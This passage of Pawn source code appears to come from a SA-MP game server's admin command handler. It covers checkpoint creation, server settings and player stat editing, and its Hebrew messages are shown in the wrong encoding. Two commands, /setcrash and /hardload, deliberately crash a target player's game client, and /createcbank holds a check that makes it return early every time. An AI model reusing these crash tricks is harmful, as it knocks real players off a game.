	if(equal(cmd,"/createcbank") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
	    if(playerid != -1) return SendClientMessage(playerid, red, " .рЇ∙°х· цх Ёчёюф юыщххя ∙сЁў фўьря ўщщэ ссЁў ф°тщь");
		if((playerinfo[playerid][admin] < 18 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /createcbank [clan name] :Ўх°· ф∙щюх∙");
		new c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		if(!claninfo[c][hashq]) return SendClientMessage(playerid,red," .ьўьря фцф рщя юЇўуф хьыя рщ рЇ∙° ьщЎх° ьх сЁў");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		//if(claninfo[c][ccp] != -1) return SendClientMessage(playerid,red," .ьўьря фцф ыс° щ∙ сЁў ўьря");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		format(cmd,sizeof(cmd),"/DM/Clans/%s.ini",claninfo[c][cname]);
		fsetfloat(cmd,"CPX",p[0]);
		fsetfloat(cmd,"CPY",p[1]);
		fsetfloat(cmd,"CPZ",p[2]);
		//claninfo[c][ccp] = CreateCheckpoint(p[0],p[1],p[2],0,world_normal,cp_cbank,default_cpsize,default_cpdistance,0.0,c);
		return 1;
	}
	if(equal(cmd,"/deletecbank") && (IsPlayerMAdmin(playerid) || PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))))
	{
		if((playerinfo[playerid][admin] < 18 && !PlayerHasRank(playerid,RankID("юЁфьщ ўьрЁщэ"))) && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || IsNumeric(cmd)) return SendClientMessage(playerid,white," /createcbank [clan name] :Ўх°· ф∙щюх∙");
		new c = clannumber(cmd);
		if(c == -1) return SendClientMessage(playerid,red," .ўьря ∙тхщ");
		//if(claninfo[c][ccp] == -1) return SendClientMessage(playerid,red," .ьўьря фцф рщя сЁў ўьря");
		//cpinfo[claninfo[c][ccp]][cpactive] = 0;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][cp] == playerinfo[playerid][cp]) ReloadCPs(i);
		format(cmd,sizeof(cmd),"/DM/Clans/%s.ini",claninfo[c][cname]);
		fremovekey(cmd,"CPX");
		fremovekey(cmd,"CPY");
		fremovekey(cmd,"CPZ");
		//claninfo[c][ccp] = -1;
		format(cmd,sizeof(cmd)," .%s ючў· р· фсЁў ∙ь фўьря",claninfo[c][cname]);
		SendClientMessage(playerid,green,cmd);
		return 1;
	}
	if(equal(cmd,"/createvgarage") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_vgarage,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createbar") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_bar,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createphone") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[6];
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[5] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		CreateCheckpoint(p[0],p[1],p[2]-0.3,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_phone,p[4],p[5],p[3],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createatm") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[6];
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[5] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetPlayerFacingAngle(playerid,p[3]);
		CreateCheckpoint(p[0],p[1],p[2]-0.3,GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_atm,p[4],p[5],p[3],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createsgarage") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_sgarage,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createlh") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_lighthouse,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createabank") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_abank,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/creategambling") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5], typ = 0;
		cmd = strtok(cmdtext,idx), typ = strval(cmd);
		if(typ < 0 || typ > 1) typ = 0;
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_gambling,p[3],p[4],.par = typ,.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createstore") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5], typ = 0;
		cmd = strtok(cmdtext,idx), typ = strval(cmd);
		if(typ < 1 || typ > 4) typ = 1;
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		switch(typ)
		{
			case 1: cmd = "чЁх· стущэ";
			case 2: cmd = "чЁх· чщх·";
			case 3: cmd = "чЁх· ЇЎЎх·";
			case 4: cmd = "чЁх· ЇьрЇхЁщэ";
		}
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_store,p[3],p[4],.par = typ,.thecpname = cmd,.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createinfo") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_info,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createvstation") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_vstation,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createdancing") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_dancing,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/createjumping") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		if(playerinfo[playerid][cp] != -1) return SendClientMessage(playerid,red," .ыс° щ∙ ьщуъ Ў'ўЇхщЁш ыь∙фх");
		new Float:p[5];
		cmd = strtok(cmdtext,idx), p[3] = !strlen(cmd) ? default_cpsize : floatstr(cmd),
		cmd = strtok(cmdtext,idx), p[4] = !strlen(cmd) ? default_cpdistance : floatstr(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreateCheckpoint(p[0],p[1],p[2],GetPlayerInterior(playerid),GetPlayerVirtualWorld(playerid),cp_jumping,p[3],p[4],.wt = 1);
		return 1;
	}
	if(equal(cmd,"/pickup") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		new Float:p[3], m, File:f, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /pickup [model] :Ўх°· ф∙щюх∙");
		m = strval(cmd);
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		CreatePickupEx(m,2,p[0],p[1],p[2]);
		f = fopen(file_pickups,io_append);
		format(string,sizeof(string),"CreatePickupEx(%d,2,%.4f,%.4f,%.4f);\r\n",m,p[0],p[1],p[2]);
		fwrite(f,string);
		fclose(f);
		return 1;
	}
	if(equal(cmd,"/deactivecp") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		cpinfo[playerinfo[playerid][cp]][cpactive] = 0;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][cp] == playerinfo[playerid][cp]) ReloadCPs(i);
		SendClientMessage(playerid,green," .фЎ'ўЇхщЁш Ёючў");
		return 1;
	}
	if(equal(cmd,"/reloadcps") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 18 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 18");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /reloadcps [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		ReloadCPs(id);
		SendClientMessage(playerid,green," .°ЄЁхя схЎЄ");
		if(playerid != id) SendClientMessage(id,green," .°ЄЁхя схЎЄ");
		return 1;
	}
	if(equal(cmd,"/spassword") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S], pass[32];
		cmd = strtok(cmdtext,idx);
		GetServerVarAsString("password",pass,sizeof(pass));
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /spassword [password] :Ўх°· ф∙щюх∙");
			if(equal(pass,"0")) string = ".ф∙°· ы°тЄ Ї·хч";
			else format(string,sizeof(string)," %s :фёщёюр фЁхычщ· фщр",pass);
			return SendClientMessage(playerid,white,string);
		}
		format(string,sizeof(string),"password %s",cmd);
		SendRconCommand(string);
		if(equal(cmd,"0")) SendClientMessageToAll(white," * .ф∙°· ЁЇ·ч");
		else
		{
			if(equal(pass,"0")) SendClientMessageToAll(white," * .ф∙°· ЁЁЄь");
			else SendClientMessageToAll(white," * .ёщёю· ф∙°· ЄхуыЁф");
			format(string,sizeof(string)," .%s ёщёю· ф∙°· ∙хЁ·ф ь",cmd);
			SendClientMessage(playerid,white,string);
		}
		return 1;
	}
	if(equal(cmd,"/hostname") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S], hn[64];
		cmd = strrest(cmdtext,idx);
		GetServerVarAsString("hostname",hn,sizeof(hn));
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /hostname [name] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," :ф∙э фўщщэ ∙ь ф∙°·");
			return SendClientMessage(playerid,white,hn);
		}
		format(string,sizeof(string),"hostname %s",cmd);
		format(hostname_,sizeof(hostname_),cmd);
		SendRconCommand(string);
		format(string,sizeof(string)," :∙щЁф р· ∙э ф∙°· ь %s фрующя",GetName(playerid));
		SendClientMessageToAll(white,string);
		SendClientMessageToAll(white,cmd);
		return 1;
	}
	if(equal(cmd,"/loadfs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /loadfs [filterscript name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"loadfs %s",cmd);
		filterscriptLoading = 1;
		SendRconCommand(string);
		format(string,sizeof(string)," -%s.amx Ёщёщхя ьшЄщЁ· фЇщьш°ёў°щЇш-",cmd);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/unloadfs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /unloadfs [filterscript name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"unloadfs %s",cmd);
		filterscriptUnloading = 1;
		SendRconCommand(string);
		format(string,sizeof(string)," -%s.amx Ёщёщхя ьфх°у· фЇщьш°ёў°щЇш-",cmd);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/reloadfs") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /reloadfs [filterscript name] :Ўх°· ф∙щюх∙");
		format(string,sizeof(string),"reloadfs %s",cmd);
		filterscriptLoading = 1, filterscriptUnloading = 1;
		SendRconCommand(string);
		format(string,sizeof(string)," -%s.amx Ёщёщхя ьфх°у· хшЄщЁ· фЇщьш°ёў°щЇш-",cmd);
		SendClientMessageToAll(green,string);
		return 1;
	}
	if(equal(cmd,"/setcrash") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 20 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 20");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /setcrash [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerPos(id,0.0,0.0,0.0);
		SetTimerEx("Crash",1000,0,"i",id);
		format(string,sizeof(string)," .%s фў°ё· р·",GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/hardload") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /hardload [id/name] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		SetPlayerPos(id,1160423168.0000,-988259008.0000,1096461440.0000);
		SendClientMessage(id,lightred,"GET READY");
		format(string,sizeof(string)," .%s фў°ё· р·",GetName(id));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/edituser") && IsPlayerMAdmin(playerid))
	{
		if(playerinfo[playerid][admin] < 19 && playerid != ConsoleID) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ьЇчх· с°ю· рующя 19");
		new cmd2[256], id, set, string[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || IsNumeric(cmd2))
		{
			SendClientMessage(playerid,white," /edituser [id/name] [key] :Ўх°· ф∙щюх∙");
			SendClientMessage(playerid,white," keys: kills, deaths, level, energy, hitman, clevel, klevel, dlevel, headshots");
			return 1;
		}
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(!CommandAllowed(playerid,id,cmdtext)) return 1;
		if(equal(cmd2,"kills"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] kills [kills] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .юёЇ° ф°щтх· ∙тхщ");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· юёЇ° фф°щтх· ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· юёЇ° фф°щтх· ∙ьъ ь %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][kills] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"Kills",set);
		}
		else if(equal(cmd2,"deaths"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] deaths [deaths] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .юёЇ° ЇЄющ юхх· ∙тхщ");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· юёЇ° ЇЄющ фюхх· ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· юёЇ° ЇЄющ фюхх· ∙ьъ ь %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][deaths] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"Deaths",set);
		}
		else if(equal(cmd2,"level"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] level [new level] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0 || set > sizeof(levels)-1) return SendClientMessage(playerid,red," .°юф ∙тхщф");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· ф°юф ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· ф°юф ∙ьъ ь %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][level] = set;
			Border(id,"update");
			if(playerinfo[id][logged]) fsetint(fuser(id),"PlayerLevel",set);
		}
		else if(equal(cmd2,"energy"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] energy [new energy] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0 || set > 10000) return SendClientMessage(playerid,red," .ыюх· рЁ°тщф ∙тхщф");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· р· ыюх· фрЁ°тщф ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· ыюх· фрЁ°тщф ∙ьъ ь %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][energy] = set;
			if(playerinfo[id][logged]) fsetint(fuser(id),"Energy",set);
		}
		else if(equal(cmd2,"hitman"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] hitman [amount] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0 || set > 999999999) return SendClientMessage(playerid,red," .юёЇ° ыёє ∙тхщ");
			format(string,sizeof(string)," .ь %d$ %s ∙щЁщ· р· фыёє ∙∙юх Єь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· фыёє ∙∙юх Єьщъ %d$",set);
			SendClientMessage(id,green,string);
			playerinfo[id][hitman] = set;
		}
		else if(equal(cmd2,"clevel"))
		{
			if(playerinfo[id][work] != work_cop) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр ∙хш°");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] clevel [cop level] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .°юф ∙тхщф");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· °ю· ф∙хш° ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· ф∙хш° ∙ьъ ь %d$",set);
			SendClientMessage(id,green,string);
			playerinfo[id][coplevel] = set;
		}
		else if(equal(cmd2,"klevel"))
		{
			if(playerinfo[id][work] != work_killer) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр °хЎч");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] klevel [killer level] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .°юф ∙тхщф");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· °ю· ф°хЎч ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· ф°хЎч ∙ьъ ь %d",set);
			SendClientMessage(id,green,string);
			playerinfo[id][killerlevel] = set;
		}
		else if(equal(cmd2,"dlevel"))
		{
			if(playerinfo[id][work] != work_doctor) return SendClientMessage(playerid,red," .ф∙чўя фЁсч° ьр °хЇр");
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] dlevel [doctor level] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .°юф ∙тхщф");
			format(string,sizeof(string)," .ь %d %s ∙щЁщ· °ю· ф°хЇр ∙ь",set,GetName(id));
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .фрующя ∙щЁф р· °ю· ф°хЇр ∙ьъ ь %d$",set);
			SendClientMessage(id,green,string);
			playerinfo[id][doctorlevel] = set;
		}
		else if(equal(cmd2,"headshots"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /edituser [id/name] headshots [headshots] :Ўх°· ф∙щюх∙");
			set = strval(cmd);
			if(set < 0) return SendClientMessage(playerid,red," .юёЇ° ф°щтх· фу-∙хш ∙тхщ");
